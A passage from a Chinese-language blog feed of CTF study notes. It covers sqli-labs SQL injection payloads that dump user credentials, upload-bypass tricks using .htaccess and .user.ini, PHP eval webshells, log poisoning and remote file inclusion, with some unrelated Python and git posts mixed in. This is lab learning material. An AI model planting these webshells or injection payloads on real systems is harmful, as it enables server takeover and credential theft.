class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))<span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span>语法</span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br><span class="line"></span><br><span class="line">基操</span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata; 查库名</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> schema_name        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> challenges         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> security           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>; 查表名</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> table_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> emails     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> referers   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> uagents    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> users      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>; 查列名</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> column_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> id          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> username    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.users; 查数据</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> Dumb     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Angelina <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Dummy    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> secure   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> stupid   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> superman <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> batman   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> admin    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> admin1   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> admin2   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> admin3   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> dhakkan  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> admin4   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br></pre></td></tr></table></figure><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><blockquote><p>构造逻辑判断</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">主要的字符串截取函数</span><br><span class="line"></span><br><span class="line">mid(column_name,<span class="keyword">start</span>[,length]) </span><br><span class="line">MID 函数用于从文本字段中提取字符。</span><br><span class="line"><span class="keyword">SELECT</span> MID(column_name,<span class="keyword">start</span>[,length]) <span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">start</span>从<span class="number">1</span>开始索引，即从<span class="keyword">start</span>开始，返回length长度的字符</span><br><span class="line"></span><br><span class="line">MID(DATABASE(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>’a’,查看数据库名第一位</span><br><span class="line">MID(DATABASE(),<span class="number">2</span>,<span class="number">1</span>)查看数据库名第二位，依次查看各位字符。</span><br><span class="line"></span><br><span class="line">MID((<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>xxx LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>’a’此处column_name参数可以为<span class="keyword">sql</span>语句，可自行构造<span class="keyword">sql</span>语句进行注入。</span><br><span class="line"></span><br><span class="line">substr()函数</span><br><span class="line">用法同mid相同</span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span>()函数</span><br><span class="line"><span class="keyword">Left</span> (string, n)</span><br><span class="line">得到字符串从左部开始共n个字符，即前n个字符</span><br><span class="line"></span><br><span class="line">ord()<span class="operator">/</span>ascii函数</span><br><span class="line">返回字符的ascii</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3><p>1-4是一个系列，基于报错注入</p><p>5-</p><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><blockquote><p>单引号注入</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 对列重新排序用来判断有几列</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata--+ 暴库</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span><span class="comment">--+ （3后面空格）爆表</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+ 暴列</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(password),group_concat(username) <span class="keyword">from</span> users<span class="comment">--+ 暴字段</span></span><br></pre></td></tr></table></figure><h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><blockquote><p>整数注入</p></blockquote><p>和less1一样,不过这个不需要用 ‘ 闭合</p><h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><blockquote><p>单引号+括号注入</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">*</span> <span class="keyword">where</span> id <span class="operator">=</span> (<span class="string">&#x27;id&#x27;</span>) limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">id <span class="operator">=</span> (<span class="string">&#x27; 1&#x27;</span>)<span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span>(<span class="string">&#x27;1 &#x27;</span>) 不需<span class="comment">--+注释</span></span><br><span class="line">id <span class="operator">=</span> (<span class="string">&#x27; &#x27;</span>) <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="comment">--+ &#x27;) 需注释</span></span><br></pre></td></tr></table></figure><h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><blockquote><p>双引号+括号注入</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;) union select 1,group_concat(password),group_concat(username) from users--+ 用-1防止覆盖</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;用docker把靶场安装在了虚拟机上，跟着天书走一遍，希望有所收获，不得不说docker和ssh真香，计划一部分一部分写，今天光做个报错注入已经弄了2个小时了。。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="ctf靶场" scheme="http://blog.haorical.top/categories/ctf%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="ctf" scheme="http://blog.haorical.top/tags/ctf/"/>
    
    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
    
    <category term="sql注入" scheme="http://blog.haorical.top/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>python爬虫深入</title>
    <link href="http://blog.haorical.top/posts/3d5e7979/"/>
    <id>http://blog.haorical.top/posts/3d5e7979/</id>
    <published>2021-11-21T06:30:45.000Z</published>
    <updated>2021-11-21T16:58:54.460Z</updated>
    
    <content type="html"><![CDATA[<h2 id="jsonpath"><a href="#jsonpath" class="headerlink" title="jsonpath"></a>jsonpath</h2><p>解决json镶套索引问题</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ 根节点</span><br><span class="line"></span><br><span class="line">. 子节点</span><br><span class="line"></span><br><span class="line">.. 匹配所有子孙节点</span><br><span class="line"></span><br><span class="line">pip install jsonpath</span><br><span class="line"><span class="keyword">from</span> jsonpath <span class="keyword">import</span> jsonpath</span><br><span class="line">jsonpath.(data, &#x27;$.1.2.3.4.5.key&#x27;) -&gt; list</span><br><span class="line">jsonpath.(data, &#x27;$..key&#x27;) -&gt; list</span><br></pre></td></tr></table></figure><h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>xpath helper插件</p><p>xpath语法</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">基础语法</span><br><span class="line">//title/text() # 取标签间文本内容</span><br><span class="line">//link/@href   # 提取属性</span><br><span class="line">节点修饰语法</span><br><span class="line">/html/body/div[3]/div[1] # 标签从1开始索引</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;jsonpath&quot;&gt;&lt;a href=&quot;#jsonpath&quot; class=&quot;headerlink&quot; title=&quot;jsonpath&quot;&gt;&lt;/a&gt;jsonpath&lt;/h2&gt;&lt;p&gt;解决json镶套索引问题&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;ta</summary>
      
    
    
    
    <category term="python学习" scheme="http://blog.haorical.top/categories/python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="python" scheme="http://blog.haorical.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>git更新</title>
    <link href="http://blog.haorical.top/posts/bc46b23a/"/>
    <id>http://blog.haorical.top/posts/bc46b23a/</id>
    <published>2021-11-18T15:23:34.000Z</published>
    <updated>2021-11-18T15:34:21.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><blockquote><p>因为vscode ssh要求服务器git得&gt;2,更新了个git，发现push不上去了，又把服务器搞崩了，还得重新配环境。。。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</span><br><span class="line"></span><br><span class="line">yum install  gcc perl-ExtUtils-MakeMaker</span><br><span class="line"></span><br><span class="line">yum remove git</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line"></span><br><span class="line">wget https:&#x2F;&#x2F;mirrors.edge.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">tar -xvf git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">cd git-2.23.0&#x2F;</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install</span><br><span class="line"></span><br><span class="line">echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;步骤&quot;&gt;&lt;a href=&quot;#步骤&quot; class=&quot;headerlink&quot; title=&quot;步骤&quot;&gt;&lt;/a&gt;步骤&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;因为vscode ssh要求服务器git得&amp;gt;2,更新了个git，发现push不上去了，又把服务器搞崩了，还得</summary>
      
    
    
    
    <category term="开发工具" scheme="http://blog.haorical.top/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="git" scheme="http://blog.haorical.top/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>20211118</title>
    <link href="http://blog.haorical.top/posts/5c3bb6e4/"/>
    <id>http://blog.haorical.top/posts/5c3bb6e4/</id>
    <published>2021-11-18T12:06:19.000Z</published>
    <updated>2021-11-18T15:20:40.710Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>上传.htaccess </p><p>上传shell.jpeg</p><p>直接扫目录即可，没有过滤，非常友善</p><pre><code>var_dump(file_get_contents(&#39;/flag&#39;));</code></pre><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>上传.user.ini不过是这样配置才能过</p><pre><code>auto_prepend_file=shell.jpeg</code></pre><p>以前都是</p><pre><code>auto_append_file=1.txt</code></pre><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;MRCTF2020-你传你🐎呢&quot;&gt;&lt;a href=&quot;#MRCTF2020-你传你🐎呢&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]你传你🐎呢&quot;&gt;&lt;/a&gt;[MRCTF2020]你传你🐎呢&lt;/h2&gt;&lt;p&gt;上传.htaccess </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>20211117</title>
    <link href="http://blog.haorical.top/posts/cc84ab75/"/>
    <id>http://blog.haorical.top/posts/cc84ab75/</id>
    <published>2021-11-17T13:53:13.000Z</published>
    <updated>2021-11-18T15:20:40.711Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>先上传几个正常图片测试，jpeg能用</p><p>上传shell过滤了&lt;?</p><pre><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code></pre><p>绕过，上传.htaccess</p><pre><code>AddType application/x-httpd-php .jpeg</code></pre><p>把system过滤了</p><p>可以用var_dump打印</p><pre><code>var_dump(scandir(&quot;/&quot;))var_dump(file_get_contents(&quot;/flag&quot;));</code></pre><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>先githack把git扒下来，有个index.php</p><p>代码审计，过滤的比较多</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#把伪协议读取flag.php给ban了</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#套娃过滤（无参数过滤） 需要构造一个类似这玩意的东西a(b(c(d(e(f())))));</span></span><br><span class="line">           <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#过滤函数关键字</span></span><br></pre></td></tr></table></figure><p>然后开始构造</p><pre><code>show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GXYCTF2019-BabyUpload&quot;&gt;&lt;a href=&quot;#GXYCTF2019-BabyUpload&quot; class=&quot;headerlink&quot; title=&quot;[GXYCTF2019]BabyUpload&quot;&gt;&lt;/a&gt;[GXYCTF2019]BabyUpload</summary>
      
    
    
    
    <category term="ctf每日一题" scheme="http://blog.haorical.top/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://blog.haorical.top/tags/ctf/"/>
    
    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>jwt总结</title>
    <link href="http://blog.haorical.top/posts/e8e4811b/"/>
    <id>http://blog.haorical.top/posts/e8e4811b/</id>
    <published>2021-11-17T12:54:53.000Z</published>
    <updated>2021-11-18T15:20:40.713Z</updated>
    
    
    
    
    <category term="ctf每日一题" scheme="http://blog.haorical.top/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://blog.haorical.top/tags/ctf/"/>
    
    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>信息搜集</title>
    <link href="http://blog.haorical.top/posts/b21d488/"/>
    <id>http://blog.haorical.top/posts/b21d488/</id>
    <published>2021-11-17T11:35:13.000Z</published>
    <updated>2021-11-17T12:52:11.374Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phps"><a href="#phps" class="headerlink" title="phps"></a>phps</h2><h2 id="git"><a href="#git" class="headerlink" title=".git/"></a>.git/</h2><h2 id="svn"><a href="#svn" class="headerlink" title=".svn/"></a>.svn/</h2><h2 id="swp"><a href="#swp" class="headerlink" title=".swp"></a>.swp</h2><p>ls -al</p><h2 id="http-dbcha-com"><a href="#http-dbcha-com" class="headerlink" title="http://dbcha.com/"></a><a href="http://dbcha.com/">http://dbcha.com/</a></h2><h2 id="admin密码"><a href="#admin密码" class="headerlink" title="/admin密码"></a>/admin密码</h2><h2 id="editor"><a href="#editor" class="headerlink" title="editor"></a>editor</h2><h2 id="tz-php探针"><a href="#tz-php探针" class="headerlink" title="tz.php探针"></a>tz.php探针</h2><h2 id="cdn-绕过"><a href="#cdn-绕过" class="headerlink" title="cdn 绕过"></a>cdn 绕过</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;phps&quot;&gt;&lt;a href=&quot;#phps&quot; class=&quot;headerlink&quot; title=&quot;phps&quot;&gt;&lt;/a&gt;phps&lt;/h2&gt;&lt;h2 id=&quot;git&quot;&gt;&lt;a href=&quot;#git&quot; class=&quot;headerlink&quot; title=&quot;.git/&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="ctf学习" scheme="http://blog.haorical.top/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="ctf" scheme="http://blog.haorical.top/tags/ctf/"/>
    
    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>反序列化总结</title>
    <link href="http://blog.haorical.top/posts/1e128b6c/"/>
    <id>http://blog.haorical.top/posts/1e128b6c/</id>
    <published>2021-11-15T13:18:08.000Z</published>
    <updated>2021-11-17T12:52:11.376Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>文件上传总结</title>
    <link href="http://blog.haorical.top/posts/ea42f6a6/"/>
    <id>http://blog.haorical.top/posts/ea42f6a6/</id>
    <published>2021-11-10T15:14:50.000Z</published>
    <updated>2021-11-15T09:46:43.179Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><ol><li>绕过各种前端过滤</li><li>上传.user.ini/.htaccess</li><li>上传包含一句话文件/日志包含/远程文件包含</li><li>绕过关键字过滤</li><li>绕过特殊类型如二次渲染/httpd</li><li>session竞争</li></ol><h2 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h2><p>直接改前端代码即可</p><h2 id="简单后端过滤"><a href="#简单后端过滤" class="headerlink" title="简单后端过滤"></a>简单后端过滤</h2><p>content-type 改为 image/png(jpg/gif)</p><p>filename 改后缀</p><p>改文件头为gif头</p><pre><code>GIF89a</code></pre><p>改文件头为png头，直接在hex改</p><pre><code>89504e470d0a</code></pre><p>00截断</p><p>test.php1png</p><p>hex中将31改为00</p><p>php3 php4测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="user-ini上传"><a href="#user-ini上传" class="headerlink" title=".user.ini上传"></a>.user.ini上传</h2><p>upload/下存在index.php</p><p>先上传.user.ini，再上传1.txt或其他支持上传类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .user.ini</span></span><br><span class="line">auto_append_file=<span class="number">1.</span>txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;% @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); %&gt;</span><br></pre></td></tr></table></figure><h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><p>[]替换为{}</p><p>[] {}全过滤</p><pre><code>&lt;?=@eval(array_pop($_POST));?&gt;</code></pre><p>; 可直接去掉;</p><p>空格过滤将空格改hex为0d</p><p>. 过滤用远程文件包含</p><h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>过滤()<br>.user.ini 自动包含文件如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 过滤 log 用 . 分开即可</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/nginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">若有过滤，可这样写</span><br><span class="line"><span class="meta">&lt;?=</span>include1<span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/nginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span><span class="meta">?&gt;</span></span><br><span class="line">之后改hex将<span class="number">1</span>改为od</span><br></pre></td></tr></table></figure><p>域名下随机写入1.txt，改User-Agent为</p><pre><code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code></pre><p>访问upload/测试</p><h2 id="getimagesize绕过"><a href="#getimagesize绕过" class="headerlink" title="getimagesize绕过"></a>getimagesize绕过</h2><p>改头为gif头</p><p>GIF89a</p><h2 id="include-url-远程文件包含"><a href="#include-url-远程文件包含" class="headerlink" title="include url 远程文件包含"></a>include url 远程文件包含</h2><p>用我自己的url，返回一个一句话木马</p><p><a href="http://47.100.75.233/">http://795102185</a></p><pre><code>&lt;?=include&#39;http://795102185&#39;&gt;</code></pre><p>基本可以通杀</p><h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><h3 id="gif格式"><a href="#gif格式" class="headerlink" title="gif格式"></a>gif格式</h3><p>比较简单，直接对比没有改变的地方，在里面直接插入即可</p><h3 id="png格式"><a href="#png格式" class="headerlink" title="png格式"></a>png格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 